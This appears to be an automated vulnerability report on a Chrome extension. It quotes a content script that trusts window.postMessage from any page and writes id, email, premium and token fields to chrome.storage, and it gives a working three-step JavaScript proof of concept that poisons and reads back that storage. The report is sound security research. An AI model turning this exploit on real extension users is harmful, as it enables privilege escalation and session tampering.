# CoCo Analysis: pjbephkiebgcldoaijkepmljpgjpndal

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 4 (multiple fields: user.premium, user.token, user.id, user.email)

---

## Sink: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pjbephkiebgcldoaijkepmljpgjpndal/opgen_generated_files/cs_0.js
Line 468: `window.addEventListener("message",function(a){a.source===window&&a.data.type&&"FROM_PAGE"===a.data.type&&a.data.user&&chrome.storage.local.set({user:{id:a.data.user.id,email:a.data.user.email,premium:a.data.user.premium,token:a.data.user.token}}...`

**Code:**

```javascript
// Content script - userScript.js

// Storage retrieval and leak - Line 467
chrome.storage.local.get(null, function(a) {
    chrome.runtime.lastError ? console.log(chrome.runtime.lastError.message) :
    a.hasOwnProperty("userdata") ?
        (chrome.storage.local.remove("userdata"),
         window.postMessage({type:"FROM_CONTENTSCRIPT", userdata:a.userdata}, "*")) : // ← Leaks userdata
    a.hasOwnProperty("user") &&
        window.postMessage({type:"FROM_CONTENTSCRIPT", user:a.user}, "*") // ← Leaks user object
});

// Storage write - Line 468
window.addEventListener("message", function(a) {
    a.source === window &&
    a.data.type &&
    "FROM_PAGE" === a.data.type &&
    a.data.user &&
    chrome.storage.local.set({
        user: {
            id: a.data.user.id,           // ← attacker-controlled
            email: a.data.user.email,     // ← attacker-controlled
            premium: a.data.user.premium, // ← attacker-controlled
            token: a.data.user.token      // ← attacker-controlled
        }
    }, function() {
        chrome.runtime.lastError &&
        (console.error("Error saving user from content script"),
         alert("Error saving user from content script"))
    })
}, false);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from malicious webpage

**Attack:**

```javascript
// Step 1: Poison the storage with attacker-controlled data
window.postMessage({
    type: "FROM_PAGE",
    user: {
        id: "attacker-id",
        email: "attacker@evil.com",
        premium: true,
        token: "malicious-token"
    }
}, "*");

// Step 2: Reload the page or wait for the content script to re-inject
// The extension automatically retrieves and leaks the data back on load (Line 467)

// Step 3: Receive the poisoned data back
window.addEventListener("message", function(event) {
    if (event.data.type === "FROM_CONTENTSCRIPT" && event.data.user) {
        console.log("Successfully poisoned and retrieved user data:", event.data.user);
        // attacker now has confirmation of storage poisoning
    }
});
```

**Impact:** Complete storage exploitation chain allowing an attacker to poison extension storage with arbitrary user data (id, email, premium status, token) and subsequently retrieve this poisoned data. This enables privilege escalation (setting premium to true) and potential session manipulation via the token field.
